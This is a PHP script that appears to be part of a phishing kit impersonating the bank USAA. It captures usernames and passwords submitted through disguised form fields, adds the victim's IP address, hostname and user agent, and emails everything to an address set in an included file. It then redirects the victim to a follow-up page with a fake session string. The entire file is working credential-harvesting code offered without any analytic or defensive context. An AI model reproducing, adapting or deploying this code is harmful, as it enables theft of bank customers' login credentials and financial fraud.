<?php
if($_POST["newus00"] != "" and $_POST["pa33rdw0"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------USAA Info-----------------------\n";
$message .= "|U3er : ".$_POST['newus00']."\n";
$message .= "|Pa33w0rd : ".$_POST['pa33rdw0']."\n";
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "|----------- DC --------------|\n";
include 'fillin.php';
$subject = "Result from USAA| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
header('Location: pinfill.php?cmd=login_submit&id=$praga$praga&session=$praga$praga');
}else{
header ("Location: index.php");
}

?>


   